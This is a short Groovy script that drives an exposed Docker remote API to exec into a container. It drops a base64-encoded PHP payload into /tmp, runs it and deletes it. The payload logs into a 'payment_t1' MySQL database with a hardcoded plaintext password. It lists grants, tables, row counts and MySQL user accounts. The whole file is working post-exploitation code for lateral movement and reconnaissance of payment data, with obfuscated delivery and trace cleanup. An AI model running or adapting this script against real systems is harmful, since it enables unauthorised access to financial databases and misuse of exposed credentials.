// Enumerate payment_t1 DB on 172.27.141.6:3310 (read-only)
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(0);
$pdo = new PDO("mysql:host=172.27.141.6;port=3310;dbname=payment_t1", "app_t1", "wUt22Us2CUh#+M=", array(PDO::ATTR_TIMEOUT => 8, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
echo "=== GRANTS ===\\n";
foreach ($pdo->query("SHOW GRANTS") as $r) { echo $r[0]."\\n"; }
echo "=== TABLES in payment_t1 ===\\n";
$tables = array();
foreach ($pdo->query("SHOW TABLES") as $r) { $tables[] = $r[0]; echo "TBL: ".$r[0]."\\n"; }
echo "=== ROW COUNTS ===\\n";
foreach ($tables as $tb) {
    try {
        $q = $pdo->query("SELECT COUNT(*) c FROM `$tb`");
        $c = $q->fetch(PDO::FETCH_ASSOC);
        echo "COUNT|$tb|".$c['c']."\\n";
    } catch (Exception $e) { echo "COUNT|$tb|ERR\\n"; }
}
echo "=== MYSQL USERS (si hay privilegio) ===\\n";
try { foreach ($pdo->query("SELECT user,host FROM mysql.user") as $r) { echo "MU: ".$r[0]."@".$r[1]."\\n"; } } catch (Exception $e) { echo "no mysql.user access\\n"; }
echo "PHP_DONE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/e.php && php /tmp/e.php; rm -f /tmp/e.php"

println "########## payment_t1 ENUMERATION ##########"
println execIn("5b32e909c295", cmd)
